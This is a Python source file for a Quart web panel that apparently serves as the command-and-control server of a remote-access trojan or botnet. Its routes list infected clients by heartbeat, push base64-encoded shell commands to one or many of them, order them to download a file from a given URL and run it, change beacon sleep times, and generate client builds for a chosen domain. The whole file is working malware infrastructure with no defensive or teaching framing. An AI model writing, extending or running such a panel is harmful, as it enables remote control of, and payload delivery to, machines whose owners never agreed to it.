from .backend import *
from ..utils import generate_client
from quart import *
import time
from ..config import CONFIG
import base64

import logging






app = Quart(__name__, static_folder="static")


logging.getLogger('quart.serving').setLevel(logging.ERROR)


@app.route(CONFIG["web"]["control"])
async def web_control():
    conn=get_list()
    event=get_events("global")

    c = []
    for i in conn.values():
        x = int(time.time()) - i["heartbeat"]
        i["hb"] = x
        c.append(i)
    return await render_template("manager.html",conn=c,event=event)

@app.route(CONFIG["web"]["control"]+"all",methods=['POST'])
async def batch_api():
    action = request.args.get("action")
    form = await request.get_data()
    form = loads(form)
    if action == "clear":

        clear_all(form["time"])
    if action == "shell":
        for i in form["target"]:
            lv2 = {
                "command":form["command"]
                }
            do_action(i,{
                "do":"cmd",
                "data":base64.b64encode(dumps(lv2).encode()).decode()
            })
            event = {
                "is_client":False,
                "action":"global shell",
                "time":time.asctime(time.localtime(time.time())),
                "data":form["command"]
            }
            add_events(i,event)
    if action == "download":
        for i in form["target"]:
            lv2 = {
                "http":form["http"],
                "path":form["path"],
                "is_run":form["is_run"]
                }
            do_action(i,{
                "do":"download",
                "data":base64.b64encode(dumps(lv2).encode()).decode()
            })
            event = {
                "is_client":False,
                "action":"global download",
                "time":time.asctime(time.localtime(time.time())),
                "data":"Download: %s\nSavePath: %s\nRun: %s\n" % (form["http"],form["path"],form["is_run"])
            }
            add_events(i,event)
    
    return redirect(request.referrer)

@app.route(CONFIG["web"]["control"] + "client/<uuid>",methods=['GET','POST'])
async def web_control_client(uuid):
    action = request.args.get("action")
    if request.method == 'GET':
        if action == "clear":
            del_events(uuid)
            return redirect(request.referrer)
        conn = get_conn(uuid)
        events = get_events(uuid)
        if not conn:
            return "",404
        return await render_template("control.html",conn=conn,events=events[::-1])
    else:
        
        form = await request.form
        if action == "shell":
            
            command = form['command']
            lv2 = {
                "command":command
                }
            do_action(uuid,{
                "do":"cmd",
                "data":base64.b64encode(dumps(lv2).encode()).decode()
            })
            event = {
                "is_client":False,
                "action":"shell",
                "time":time.asctime(time.localtime(time.time())),
                "data":command
            }
            add_events(uuid,event)

        if action == "remark":
            remark = form["remark_text"]
            lv2 = {
                "remark":remark,
                }
            do_action(uuid,{
                "do":"remark",
                "data":base64.b64encode(dumps(lv2).encode()).decode()
            })
            event = {
                "is_client":False,
                "action":"remark",
                "time":time.asctime(time.localtime(time.time())),
                "data":remark
            }
            add_events(uuid,event)
        if action == "sleep":
            lv2 = {
                "sleep":int(form["sleep"]),
                }
            do_action(uuid,{
                    "do":"sleep",
                    "data":base64.b64encode(dumps(lv2).encode()).decode()
                })
            event = {
                "is_client":False,
                "action":"sleep",
                "time":time.asctime(time.localtime(time.time())),
                "data":"Change Sleep: %s" % (form["sleep"])
            }
            add_events(uuid,event)
        if action == "download":
            http = form["http"]
            path = form["path"]
            is_run = form["is_run"]
            lv2 = {
                "url":http,
                "path":path,
                "is_run":is_run
                }
            do_action(uuid,{
                "do":"download",
                "data":base64.b64encode(dumps(lv2).encode()).decode()
            })
            event = {
                "is_client":False,
                "action":"download",
                "time":time.asctime(time.localtime(time.time())),
                "data":"Download: %s\nSavePath: %s\nRun: %s\n" % (http,path,is_run)
            }
            add_events(uuid,event)

        return redirect(request.referrer)



@app.route(CONFIG["web"]["backend"], methods=['POST'])
async def backend():
    # todo:check UA and other
    data = await request.get_data()
    if CONFIG["base"]["cdn"] is False:
        return handle(data, request.remote_addr)
    else:
        return handle(data, request.headers[CONFIG["base"]["source_ip_tag"]])


@app.route('/generate/', methods=['GET'])
async def generate():
    domain = request.args.get("domain")
    version = request.args.get("version")
    ok, result, filename = generate_client(domain, version)
    if not ok:
        return result
    else:
        return await send_from_directory(app.static_folder, result, as_attachment=True, attachment_filename="")
